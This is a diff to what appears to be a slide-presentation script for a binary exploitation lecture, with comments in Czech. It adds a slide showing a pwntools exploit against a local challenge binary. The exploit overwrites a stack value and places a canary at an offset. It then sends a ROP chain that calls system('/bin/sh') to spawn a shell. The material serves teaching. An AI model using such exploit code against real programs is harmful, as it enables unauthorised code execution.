@@ -374,4 +374,51 @@ terminated by signal SIGSEGV (Address boundary error)`)}`
     );
 
     yield* beginSlide("Shell part3");
+
+    code().language("python")
+
+    code().code(`from pwn import *
+bin = ELF('./bin')
+libc = ELF('/usr/lib/libc.so.6')
+context.terminal = "kitty"
+context.arch = "amd64"
+
+# io = process('../challenges/hello')
+io = gdb.debug('../challenges/hello')
+
+io.recvuntil(b"name:")
+io.sendline(
+    flat({
+        (0x5c - 0x1c): p64(1) # zapise 1 na offset 0x5c-0x1c
+    })
+)
+
+io.recvuntil(b"Welcome ")
+
+rop = ROP(libc, base=(rsp - offset), badchars=b'\\n')
+rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\\x00"))])
+rop.call(libc.symbols['exit'], [0])
+
+# Vytvori ROP chain
+# Nejdriv zavola system s argumentem adresy
+# prvniho vyskytu /bin/sh uvnitr libc (system("/bin/sh"))
+# Pote zavola exit(0)
+
+io.sendline(flat({
+    32: p32(0),
+    40: p64(canary),
+    64: rop.chain()
+}))
+
+io.interactive() # umozni interagovat s procesem
+`);
+
+    code().fontSize(24);
+
+    metaInfo().remove();
+    rect().remove();
+
+    yield* code().x(0, 1);
+
+    yield* beginSlide("pwntools part1");
 });
